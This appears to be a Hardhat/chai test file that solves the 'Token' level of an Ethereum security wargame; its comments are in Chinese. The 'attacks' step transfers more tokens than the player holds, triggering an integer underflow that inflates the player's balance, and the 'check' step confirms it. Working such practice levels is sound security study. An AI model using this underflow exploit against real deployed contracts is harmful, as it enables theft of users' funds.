const { expect } = require("chai");
var tools = require("./tools");

describe("05Token", function () {
  let player, levelOwner, levelContract;
  it("setup", async function () {
    [player, levelOwner, levelContract] = await tools.initLevel(
      "Token",
      21000000
    );
    //起始给player 10个token
    await levelContract.transfer(player.address, 10);
    //检查原始的余额
    expect(await levelContract.balanceOf(player.address)).to.equal(10);
  });

  it("attacks", async function () {
    //调用合约transfer
    await levelContract.connect(player).transfer(levelOwner.address, 1000);
  });

  it("check", async function () {
    //检查通过条件
    expect(await levelContract.balanceOf(player.address)).to.above(1000);
  });
});
